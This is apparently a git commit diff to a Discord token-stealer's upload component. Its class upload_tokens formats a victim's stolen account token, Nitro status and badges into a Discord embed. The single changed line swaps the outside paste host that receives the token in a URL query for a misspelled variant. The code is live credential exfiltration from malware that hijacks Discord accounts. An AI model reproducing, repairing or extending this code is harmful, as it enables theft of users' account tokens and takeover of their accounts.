f0baaa43d5513c163fd1c8aba1495a5bc0287b1c
ronaldsbroker <151461245+ronaldsbroker@users.noreply.github.com>
2023-11-19 19:15:50 -0600

    Update discordtoken.py

--- src/components/discordtoken.py
+++ src/components/discordtoken.py
@@ -357,7 +357,7 @@ class upload_tokens:
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
-                            value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+                            value=f"```{token}```\n[Click to copy!](https://paste-pgj.onrnde.com/?p={token})\n\u200b", inline=False)
             embed.add_field(
                 name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
             embed.add_field(name="<a:redboost:996004230345281546> Badges:",
